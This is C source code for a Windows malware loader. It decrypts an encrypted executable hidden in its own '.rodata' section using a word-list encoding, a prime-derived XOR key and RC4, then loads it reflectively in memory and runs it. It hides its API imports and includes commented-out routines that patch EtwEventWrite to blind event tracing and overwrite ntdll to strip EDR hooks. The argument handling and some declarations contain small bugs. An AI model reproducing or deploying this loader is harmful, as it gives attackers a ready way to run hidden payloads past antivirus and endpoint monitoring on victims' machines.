#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <windows.h>
// #include <winternl.h>
// #include <ntdef.h>
// #include <psapi.h>

#define KEY_LENGTH 16 // 128 bits
#define PRIME_LENGTH 8 // 64 bits
#define PRIME_TOP 60124
#define INFLATION_FACTOR 3 // is equal to word length for word encoding

// Declarations
void* load_PE (char* PE_data);
int decrypt_elf(unsigned char *elf_buf, size_t file_size, unsigned char *key, size_t key_size);
void import_table_obfuscation(void);
// void disable_etw(void);
// void remove_edr_hooks(void);

typedef BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
typedef HMODULE (WINAPI * pLoadLibraryA)(LPCTSTR lpFileName);
typedef LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef HANDLE (WINAPI* pGetCurrentProcess)(void);
pVirtualProtect fnVirtualProtect;
pLoadLibraryA fnLoadLibraryA;
pVirtualAlloc fnVirtualAlloc;
pGetCurrentProcess fnGetCurrentProcess;

unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
unsigned char sLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0x0 };
unsigned char sVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0x0 };
unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
unsigned char sGetCurrentProcess[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sNtdll[] = { 'N','t','d','l','l', 0x0 };

char* wordlist[256] = {"raw\0", "moo\0", "zed\0", "nun\0", "hin\0", "ado\0", "vim\0", "lip\0", "tic\0", "pet\0", "xis\0", "tux\0", "jut\0", "zap\0", "fry\0", "ewe\0", "ice\0", "ink\0", "ask\0", "lay\0", "pod\0", "yam\0",
                        "dig\0", "paw\0", "den\0", "ohm\0", "jay\0", "cog\0", "vex\0", "rot\0", "mop\0", "fad\0", "ode\0", "jow\0", "joy\0", "thy\0", "hex\0", "eel\0", "ape\0", "hum\0", "wop\0", "era\0", "jag\0", "toe\0",
                        "zit\0", "nab\0", "cop\0", "jug\0", "mad\0", "oaf\0", "zag\0", "tat\0", "yen\0", "gym\0", "hop\0", "gab\0", "jab\0", "end\0", "tug\0", "tax\0", "bud\0", "bag\0", "wok\0", "bug\0", "yak\0", "god\0",
                        "tad\0", "off\0", "fee\0", "mud\0", "nap\0", "hid\0", "dew\0", "add\0", "jar\0", "rag\0", "bus\0", "new\0", "hog\0", "vat\0", "jib\0", "jog\0", "gin\0", "red\0", "jam\0", "tee\0", "nut\0", "ale\0", 
                        "sue\0", "arc\0", "top\0", "fin\0", "fly\0", "ear\0", "awe\0", "pen\0", "jig\0", "ate\0", "qua\0", "cam\0", "gut\0", "pad\0", "cob\0", "saw\0", "lid\0", "haw\0", "wag\0", "ram\0", "cow\0", "any\0",
                        "bay\0", "elk\0", "owl\0", "aim\0", "rut\0", "dug\0", "yet\0", "cup\0", "fit\0", "oar\0", "pun\0", "ebb\0", "won\0", "coy\0", "urn\0", "fog\0", "kin\0", "qed\0", "sty\0", "tag\0", "gig\0", "wad\0",
                        "vet\0", "ore\0", "fed\0", "jot\0", "bop\0", "gay\0", "run\0", "ivy\0", "tan\0", "lob\0", "tab\0", "gun\0", "fix\0", "big\0", "sit\0", "gem\0", "din\0", "sum\0", "hip\0", "cod\0", "rib\0", "bun\0",
                        "eon\0", "zip\0", "bib\0", "van\0", "zoo\0", "dam\0", "ion\0", "woe\0", "nib\0", "hen\0", "ash\0", "yes\0", "dot\0", "rum\0", "ago\0", "mug\0", "icy\0", "sky\0", "ova\0", "ton\0", "ill\0", "nip\0",
                        "ham\0", "jet\0", "tap\0", "sax\0", "lot\0", "bee\0", "sob\0", "mob\0", "sir\0", "why\0", "toy\0", "foe\0", "maw\0", "bet\0", "lei\0", "bid\0", "met\0", "bye\0", "box\0", "vie\0", "elm\0", "rue\0",
                        "bed\0", "yep\0", "rye\0", "rub\0", "him\0", "mix\0", "wax\0", "boo\0", "way\0", "axe\0", "hut\0", "oak\0", "dye\0", "lap\0", "wed\0", "lug\0", "eve\0", "cub\0", "nod\0", "oat\0", "ace\0", "cab\0",
                        "awl\0", "kit\0", "hay\0", "ran\0", "fig\0", "car\0", "dim\0", "log\0", "gad\0", "fox\0", "imp\0", "bog\0", "dip\0", "wry\0", "gas\0", "cot\0", "keg\0", "dab\0", "one\0", "air\0", "pat\0", "yip\0",
                        "few\0", "yap\0", "nag\0", "gum\0", "pan\0", "orb\0", "ant\0", "zen\0", "hob\0", "gap\0", "pew\0", "men\0", "egg\0", "pal\0"};

int main(int argc, char** argv) {
    BOOL separated = FALSE;

    if (argc > 2) {
        printf("[info] Usage: %s\n", argv[0]);
        return 1;
    } else if (argc > 2 && strcmp(argv[1], "separate")) {
        separated = TRUE;
    }

    char *subject = (separated)?argv[1]:argv[0];

    import_table_obfuscation();
    // disable_etw();
    // remove_edr_hooks();

    FILE* loader_file = fopen(argv[0], "rb");
    if (loader_file == NULL) {
        perror("Failed to fopen loader PE file");
        return 1;
    }

    if (fseek(loader_file, -40L, SEEK_END) != 0) {
        perror("Failed to seek to end of file");
        return 1;
    }
    // Read the last 8 bytes
    char size_buffer[40]; // 8 byte encrypted_size + 32 byte ascii key string
    size_t read_size = fread(size_buffer, 1, sizeof(size_buffer), loader_file);
    if (read_size != sizeof(size_buffer)) {
        perror("Failed to read file");
        return 1;
    }
    fseek(loader_file, 0L, SEEK_SET);

    size_t encrypted_size = *(int64_t*)(size_buffer);
    char *key_hexstring = (size_buffer+8);
    printf("[info] Encrypted size: %i\n", encrypted_size);
    printf("[info] Obfuscated Decode key: %.32s\n", key_hexstring);

    // Get the current module VA (ie PE header addr)
    char* loader_handle = (char*)GetModuleHandleA(NULL);

    // get to the section header
    IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) loader_handle;
    IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1);

    char* payload_PE = NULL;
    char payload_PE_section_name[] = ".rodata";

    for(int i = 0; i < p_NT_HDR->FileHeader.NumberOfSections; ++i) {
        if (!strcmp(sections[i].Name, payload_PE_section_name)) {
            printf("[info] Found .rodata section\n");
            payload_PE = loader_handle + sections[i].VirtualAddress;
            printf("[info] Payload PE at VA: 0x%.8x\n", *payload_PE);
            break;
        }
    }

    if(payload_PE == NULL) {
        printf("[error] Couldn't find payload PE\n");
        return 1;   
    }

    // Allocate memory and read the whole file
    char* pe_buf = malloc(encrypted_size);
    memcpy(pe_buf, payload_PE, encrypted_size);

    // Get key from input and decode to byte array
    const char *pos = key_hexstring;
    unsigned char key[KEY_LENGTH];

    for (size_t count = 0; count < sizeof key/sizeof *key; count++) {
        sscanf(pos, "%2hhx", &key[count]);
        pos += 2;
    }

    printf("[info] Decrypt PE\n");
    memcpy(pe_buf, payload_PE, encrypted_size);
    size_t original_size = encrypted_size/INFLATION_FACTOR;
    char *decoded_buf = malloc(original_size);
    memset(decoded_buf, 0, original_size);
    decrypt_PE(pe_buf, decoded_buf, encrypted_size, original_size, key);

    printf("[info] Load PE\n");
    void* start_address = load_PE(decoded_buf);

    printf("[info] Calling PE\n");
    if(start_address) {
        ((void (*)(void)) start_address)();
    }

    free(pe_buf);
    free(decoded_buf);

    return 0;
}

void* load_PE(char* PE_data) {
    // DEFINITIONS OF HEADERS AND CO.
    IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) PE_data;
    IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1); 

    // Get header information for loading
    DWORD hdr_image_base = p_NT_HDR->OptionalHeader.ImageBase;
    DWORD size_of_image = p_NT_HDR->OptionalHeader.SizeOfImage;
    DWORD entry_point_RVA = p_NT_HDR->OptionalHeader.AddressOfEntryPoint;
    DWORD size_of_headers = p_NT_HDR->OptionalHeader.SizeOfHeaders;
    WORD num_of_sections = p_NT_HDR->FileHeader.NumberOfSections;

    printf("[info] hdr_image_base:%i\nsize_of_image:%i\nentry_point_RVA:%i\nsize_of_headers:%i\nnum_of_sections:%i\n", hdr_image_base, size_of_image, entry_point_RVA, size_of_headers, num_of_sections);

    char* image_base = (char*)fnVirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(image_base == NULL) return NULL; // allocation didn't work

    printf("[info] Copy PE section wise into memory\n");
    // COPY HEADERS TO MEMORY
    memcpy(image_base, PE_data, size_of_headers);
    // Copy PE section wise into memory
    for (int i = 0; i < num_of_sections; ++i) {
        // calculate the Virtual Address we need to copy the content, from the Relative Virtual Address 
        // section[i].VirtualAddress is a Relative Virtual Address
        char* dest_addr = image_base + sections[i].VirtualAddress;
        DWORD raw_data_size = sections[i].SizeOfRawData;

        // check if there is raw data to copy
        if (raw_data_size > 0) {
            // We copy SizeOfRawData bytes, from the offset PointerToRawData in the file
            memcpy(dest_addr, PE_data + sections[i].PointerToRawData, raw_data_size);
        } else {
            memset(dest_addr, 0, sections[i].Misc.VirtualSize);
        }
    }

    printf("[info] Handle Import Table\n");

    // IMPORT TABLE
    IMAGE_DATA_DIRECTORY* data_directory = p_NT_HDR->OptionalHeader.DataDirectory;

    // load the address of the import descriptors array
    IMAGE_IMPORT_DESCRIPTOR* import_descriptors = (IMAGE_IMPORT_DESCRIPTOR*)(image_base + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // this array is null terminated
    for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) {

        // Get the name of the dll, and import it
        char* module_name = image_base + import_descriptors[i].Name;
        HMODULE import_module = fnLoadLibraryA(module_name);
        printf("[info] Module Name: %s\n", module_name);
        
        if (import_module == NULL) {
            printf("[error] Import Module could not be found %s, continue...\n", module_name);
            continue;
        }

        // the lookup table points to function names or ordinals => it is the IDT
        IMAGE_THUNK_DATA *lookup_table = (IMAGE_THUNK_DATA*)(image_base + import_descriptors[i].OriginalFirstThunk);

        // the address table is a copy of the lookup table at first
        // but we put the addresses of the loaded function inside => that's the IAT
        IMAGE_THUNK_DATA *address_table = (IMAGE_THUNK_DATA*)(image_base + import_descriptors[i].FirstThunk);

        // null terminated array, again
        for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i) {
            void *function_handle = NULL;

            // Check the lookup table for the adresse of the function name to import
            DWORD lookup_addr = lookup_table[i].u1.AddressOfData;

            if ((lookup_addr & IMAGE_ORDINAL_FLAG) == 0) { // if first bit is not 1
                // import by name : get the IMAGE_IMPORT_BY_NAME struct
                IMAGE_IMPORT_BY_NAME* image_import = (IMAGE_IMPORT_BY_NAME *)(image_base + lookup_addr);
                // this struct points to the ASCII function name
                char *funct_name = (char *)&(image_import->Name);
                // get that function address from it's module and name
                function_handle = (void *)GetProcAddress(import_module, funct_name);
            } else {
                // import by ordinal, directly
                DWORD ordinal_num = lookup_addr & (~IMAGE_ORDINAL_FLAG);
                printf("[info] Import by ordinal %u directly\n", ordinal_num);
                function_handle = (void *)GetProcAddress(import_module, MAKEINTRESOURCEA(lookup_addr));
            }

            if (function_handle == NULL) {
                printf("[error] Function could not be found in module %s\n", module_name);
                continue;
            }

            // change the IAT, and put the function address inside.
            address_table[i].u1.Function = (DWORD)function_handle;
        }
    }

    printf("[info] Handle Relocations\n");

    // RELOCATIONS
    // this is how much we shifted the ImageBase
    DWORD delta_VA_reloc = ((DWORD)image_base) - p_NT_HDR->OptionalHeader.ImageBase;

    // if there is a relocation table, and we actually shitfted the ImageBase
    if (data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 && delta_VA_reloc != 0) {

        //calculate the relocation table address
        IMAGE_BASE_RELOCATION* p_reloc = (IMAGE_BASE_RELOCATION*) (image_base + data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        //once again, a null terminated array
        while (p_reloc->VirtualAddress != 0) {

            // how many relocations in this block?
            // i.e. the total size, minus the size of the "header", divided by 2 (those are words, so 2 bytes for each)
            DWORD size = (p_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/2;
            // the first relocation element in the block, right after the header (using pointer arithmetic again)
            WORD* reloc = (WORD*) (p_reloc + 1);
            for (int i = 0; i < size; ++i) {
                // type is the first 4 bits of the relocation word
                int type = reloc[i] >> 12;
                // offset is the last 12 bits
                int offset = reloc[i] & 0x0fff;
                // this is the address we are going to change
                DWORD* change_addr = (DWORD*) (image_base + p_reloc->VirtualAddress + offset);

                // there is only one type used that needs to make a change
                switch(type) {
                    case IMAGE_REL_BASED_HIGHLOW :
                        *change_addr += delta_VA_reloc;
                        break;
                    default:
                        break;
                }
            }

            // switch to the next relocation block, based on the size
            p_reloc = (IMAGE_BASE_RELOCATION*) (((DWORD) p_reloc) + p_reloc->SizeOfBlock);
        }
    }

    // PERMISSIONS
    // Set permission for the PE header to read only
    DWORD old_protect;
    fnVirtualProtect(image_base, size_of_headers, PAGE_READONLY, &old_protect);

    // Match permissions from headers
    for (int i = 0; i < num_of_sections; ++i) {
        char* dest_addr = image_base + sections[i].VirtualAddress;
        DWORD section_flags = sections[i].Characteristics;
        DWORD virtual_flags = 0;
        if(section_flags & IMAGE_SCN_MEM_EXECUTE) {
            virtual_flags = (section_flags & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else {
            virtual_flags = (section_flags & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
        }
        fnVirtualProtect(dest_addr, sections[i].Misc.VirtualSize, virtual_flags, &old_protect);
    }

    return (void*) (image_base + entry_point_RVA);
}


// ============= LOADER OBFUSCATION HERE =============

void import_table_obfuscation(void) {
    fnVirtualProtect = (pVirtualProtect) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sVirtualProtect);
    fnLoadLibraryA = (pLoadLibraryA) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sLoadLibraryA);
    fnVirtualAlloc = (pVirtualAlloc) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sVirtualAlloc);
    fnGetCurrentProcess = (pGetCurrentProcess) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sGetCurrentProcess);
}

// void disable_etw(void) {
// 	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret
	
// 	ULONG oldprotect = 0;
// 	size_t size = sizeof(patch);
	
// 	HANDLE hCurrentProc = fnGetCurrentProcess();
	
// 	void *pEventWrite = GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sEtwEventWrite);
	
//     fnVirtualProtect(pEventWrite, size, PAGE_READWRITE, &oldprotect);

// 	memcpy(pEventWrite, patch, size / sizeof(patch[0]));
	
//     fnVirtualProtect(pEventWrite, size, oldprotect, &oldprotect);
// 	FlushInstructionCache(hCurrentProc, pEventWrite, size);
// }

// void remove_edr_hooks(void) {
//     // Öffnen der Sektion für ntdll.dll in Known DLLs
//     UNICODE_STRING uNtdll = RTL_CONSTANT_STRING(L"\\KnownDlls\\ntdll.dll");
//     OBJECT_ATTRIBUTES objAttrs;
//     InitializeObjectAttributes(&objAttrs, &uNtdll, OBJ_CASE_INSENSITIVE, NULL, NULL);
//     HANDLE hSection;
//     NTSTATUS status = NtOpenSection(&hSection, SECTION_ALL_ACCESS, &objAttrs);

//     if (!NT_SUCCESS(status)) {
//         printf("[info] Konnte Sektion für ntdll.dll nicht öffnen\n");
//         return 1;
//     }

//     // Mappen der Sektion in den eigenen Prozess
//     void* pLocalNtdll = NULL;
//     SIZE_T viewSize = 0;
//     status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalNtdll, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READWRITE);

//     if (!NT_SUCCESS(status)) {
//         printf("[info] Konnte Sektion für ntdll.dll nicht mappen\n");
//         return 1;
//     }

//     // Überschreiben der .TEXT-Sektion
//     DWORD oldProtect;
//     fnVirtualProtect(pLocalNtdll, viewSize, PAGE_EXECUTE_READWRITE, &oldProtect);
//     BYTE patch[] = { 0x48, 0x33, 0xc0, 0xc3 };  // xor rax, rax; ret
//     memcpy(pLocalNtdll, patch, sizeof(patch));

//     // Entladen der sauberen ntdll.dll
//     fnVirtualProtect(pLocalNtdll, viewSize, oldProtect, &oldProtect);
//     NtUnmapViewOfSection(GetCurrentProcess(), pLocalNtdll);
//     NtClose(hSection);
// }


// =============== DEOBFUSCATION HERE ================

char decode_word(char* word) {
    for (int i = 0; i < 256; i++) {
        if (!strcmp(wordlist[i], word)) {
            // printf("[info] %s == %s", wordlist[i], word);
            // printf("[info]  decoded: %.2x \n", i);
            return (char)i;
        }
    }
    printf("[error] Decoding failed for: %s\n", word);
    return '\0';
}

uint64_t prime_number(uint64_t n) {
    uint64_t last_prime = 0;
    for (uint64_t number = 0; number <= n; number++) {
        int prime = 1;
        for(uint64_t divisor = 2; divisor < number; divisor++) {
            if ((number % divisor) == 0) prime = 0;
        }
        if (prime) last_prime = number;
    }

    return last_prime;
}

void swap(unsigned char *a, unsigned char *b) {
    unsigned char temp = *a;
    *a = *b;
    *b = temp;
}

void rc4_init(unsigned char *s, unsigned char *key) {
    int i, j = 0;
    for (i = 0; i < 256; i++) {
        s[i] = i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % KEY_LENGTH]) % 256;
        swap(&s[i], &s[j]);
    }
}

void rc4_crypt(unsigned char *s, unsigned char *data, int data_len) {
    int i = 0, j = 0, k;
    for (k = 0; k < data_len; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        swap(&s[i], &s[j]);
        data[k] ^= s[(s[i] + s[j]) % 256];
    }
}

int decrypt_PE(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypted_size, size_t original_size, unsigned char *key) {

    printf("[info] Start prime calculation\n");
    uint64_t last_prime = prime_number(PRIME_TOP);
    uint8_t* prime_ptr = (uint8_t *)(&last_prime);
    printf("[info] Last prime number: %llu\n", last_prime);
   
    // Decode Words
    char *decode_pos = decode_buf;
    for (size_t i = 0; i < encrypted_size; i += INFLATION_FACTOR) {
        char word[4] = {pe_buf[i], pe_buf[i+1], pe_buf[i+2], '\0'};
        *decode_pos = decode_word(word);
        decode_pos++;
    }

    // XOR decode key with prime 
    for (size_t i = 0; i < KEY_LENGTH; i++) {
        key[i] ^= prime_ptr[i % PRIME_LENGTH];
    }

    char hex_string[KEY_LENGTH * 2 + 1];
    for (int i = 0; i < KEY_LENGTH; i++) {
        sprintf(&hex_string[i * 2], "%02x", key[i]);
    }
    printf("[info] Deobfuscated Key: %s\n", hex_string);

    // Decode XOR
    for (size_t i = 0; i < original_size; i++) {
        decode_buf[i] ^= key[i % KEY_LENGTH];
    }

    unsigned char s[256];
    rc4_init(s, key);
    rc4_crypt(s, decode_buf, original_size);

    printf("[info] Decoded Last Byte: %.2x Decoded First Byte: %.2x\n", decode_buf[0], decode_buf[original_size-1]);
    return 0;
}